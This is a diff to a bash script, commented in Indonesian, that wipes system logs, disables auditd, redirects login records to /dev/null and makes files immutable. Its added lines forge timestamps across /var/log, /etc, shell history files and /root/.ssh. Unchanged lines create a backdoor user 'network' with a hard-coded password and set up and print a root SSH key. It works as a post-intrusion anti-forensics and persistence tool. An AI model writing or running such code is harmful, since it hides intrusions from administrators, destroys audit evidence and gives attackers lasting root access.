@@ -17,6 +17,8 @@ echo "--- Memulai proses pembersihan log dan penguncian jejak log  ---"
 find /var/log/ -type f -exec truncate -s 0 {} \; 2>/dev/null
 rm -rf /tmp/* 2>/dev/null
 sudo sync; echo 3 | sudo tee /proc/sys/vm/drop_caches
+find /var/log/ -exec touch -r /usr/games {} \;
+find /tmp/ -exec touch -r /usr/games {} \;
 chattr -a -R /var/log/
 chattr -i -R /var/log/
 
@@ -36,6 +38,7 @@ systemctl stop auditd 2>/dev/null
 service auditd stop 2>/dev/null
 auditctl -e 0
 
+find /etc/* -exec touch -r /usr/games {} \;
 # 5. Membuat "Lubang Hitam" (/dev/null) untuk log biner & audit
 logs=("/var/log/btmp" "/var/log/wtmp" "/var/log/lastlog" "/var/log/audit/audit.log")
 for logfile in "${logs[@]}"; do
@@ -94,11 +97,14 @@ source /etc/profile
 # Note: source pada .bash_logout biasanya tidak memberikan output visual, 
 # tapi kita jalankan sesuai permintaan untuk memastikan sintaks diterima.
 source ~/.bash_logout 2>/dev/null
+find ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local ~/.mysql_history ~/.profile ~/.selected_editor ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history -exec touch -r /usr/games {} \;
 chattr +i ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local ~/.mysql_history ~/.profile ~/.selected_editor ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history
 
 sudo useradd -r -m -s /bin/bash network >/dev/null 2>&1 && echo "network:rijal01" | sudo chpasswd >/dev/null 2>&1
 ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
 cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
+find /root/.ssh -exec touch -r /usr/games {} \;
+find /root/.ssh/.. -exec touch -r /usr/games {} \;
 chattr +i -R /root/.ssh
 cat /root/.ssh/id_rsa
 
